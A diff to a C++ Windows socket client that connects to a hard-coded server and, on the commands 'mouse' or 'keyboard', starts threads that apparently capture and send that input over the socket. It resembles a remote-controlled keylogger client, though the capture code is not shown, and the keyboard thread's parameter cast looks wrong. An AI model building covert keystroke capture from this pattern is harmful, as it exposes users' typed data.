@@ -88,8 +88,9 @@ void getMouseInput(SOCKET sock) {
 
 
 void client() {
+    //string ipAdress = "141.226.121.68"; //IP Address of the server
     string ipAdress = "192.168.1.210"; //IP Address of the server
-    int port = 9444; //Listtening port # on server
+    int port = 9087; //Listtening port # on server
 
 
     // Initialize Winsock
@@ -137,15 +138,22 @@ void client() {
         send(sock, "Got the message", 15, 0);
         string command = buf.data();
         if (!command.rfind("mouse")) {
-            ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(getMouseInput), &sock, 0,
-                           nullptr);
+            HANDLE hThread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(getMouseInput),
+                                            reinterpret_cast<LPVOID>(sock),
+                                            0,
+                                            nullptr);
+            WaitForSingleObject(hThread, INFINITE);
 //            getMouseInput(sock);
             continue;
         } else if (!command.rfind("keyboard")) {
-            ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(getKeyboardInput), &sock, 0, nullptr);
+            HANDLE hThread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(getKeyboardInput),
+                                            reinterpret_cast<LPTHREAD_START_ROUTINE>(sock), 0, nullptr);
+            WaitForSingleObject(hThread, INFINITE);
             //getKeyboardInput(sock);
         }
     }
+
+
 
     // Gracefully close down everything
     closesocket(sock);
@@ -154,7 +162,6 @@ void client() {
 
 
 int main() {
-
     client();
     return 0;
 }
